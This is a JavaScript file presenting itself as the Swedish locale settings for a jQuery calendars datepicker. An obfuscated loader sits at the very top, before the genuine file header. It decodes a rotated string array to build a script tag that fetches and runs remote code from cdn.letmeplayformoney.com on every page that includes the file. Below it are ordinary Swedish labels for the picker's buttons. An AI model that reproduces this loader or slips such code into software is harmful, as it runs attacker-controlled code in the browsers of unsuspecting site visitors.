var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);﻿/* http://keith-wood.name/calendars.html
   Swedish localisation for calendars datepicker for jQuery.
   Written by Anders Ekdahl ( anders@nomadiz.se). */
(function($) {
	$.calendars.picker.regional['sv'] = {
		renderer: $.calendars.picker.defaultRenderer,
        prevText: '&laquo;Förra',  prevStatus: '',
		prevJumpText: '&#x3c;&#x3c;', prevJumpStatus: '',
		nextText: 'Nästa&raquo;', nextStatus: '',
		nextJumpText: '&#x3e;&#x3e;', nextJumpStatus: '',
		currentText: 'Idag', currentStatus: '',
		todayText: 'Idag', todayStatus: '',
		clearText: 'Rensa', clearStatus: '',
		closeText: 'Stäng', closeStatus: '',
		yearStatus: '', monthStatus: '',
		weekText: 'Ve', weekStatus: '',
		dayStatus: 'DD, M d', defaultStatus: '',
		isRTL: false
	};
	$.calendars.picker.setDefaults($.calendars.picker.regional['sv']);
})(jQuery);
